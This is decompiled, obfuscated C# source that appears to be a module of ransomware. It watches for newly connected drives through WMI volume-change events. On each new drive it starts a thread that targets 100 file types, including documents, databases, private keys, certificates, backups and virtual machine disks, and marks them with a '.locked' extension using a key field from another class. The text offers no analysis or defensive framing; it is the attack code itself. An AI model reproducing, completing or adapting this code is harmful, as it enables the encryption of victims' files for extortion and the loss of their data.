using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Threading;

namespace oEqFtKwIikP;

internal static class qmccBJLXnWn
{
	[CompilerGenerated]
	private sealed class SRCJtOzwtPE
	{
		public DriveInfo uYmRvoXSEEUNxC;

		public void _003CWatcherOnEventArrived_003Eb__0()
		{
			ieyWohRMXsyos.gAlhnRVHSxyaN(uYmRvoXSEEUNxC.Name, new string[100]
			{
				"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
				"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
				"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
				"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
				"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
				"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
				"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
				"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
				"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
				"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
			}, ".locked", new string[0], ieyWohRMXsyos.WrmiVjDyracfcM);
		}
	}

	public static void MSpVxwAnJkbUB()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0023: Expected O, but got Unknown
		try
		{
			ManagementEventWatcher val = new ManagementEventWatcher();
			WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
			val.add_EventArrived(new EventArrivedEventHandler(eURqEsHAikC));
			val.set_Query((EventQuery)(object)query);
			val.Start();
			val.WaitForNextEvent();
		}
		catch
		{
		}
	}

	private static void eURqEsHAikC(object sender, EventArrivedEventArgs e)
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length <= 0)
			{
				return;
			}
			DriveInfo[] array = drives;
			foreach (DriveInfo uYmRvoXSEEUNxC in array)
			{
				if (!uYmRvoXSEEUNxC.IsReady || ieyWohRMXsyos.GrDdmoqpEPCpU.Contains(uYmRvoXSEEUNxC.Name))
				{
					continue;
				}
				try
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						ieyWohRMXsyos.gAlhnRVHSxyaN(uYmRvoXSEEUNxC.Name, new string[100]
						{
							"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
							"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
							"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
							"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
							"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
							"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
							"sqlite3", "sqlitedb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf", "cert",
							"docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx", "mov",
							"xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql", "ora",
							"mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf", "7z"
						}, ".locked", new string[0], ieyWohRMXsyos.WrmiVjDyracfcM);
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = false;
					thread.Start();
					thread.Join();
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
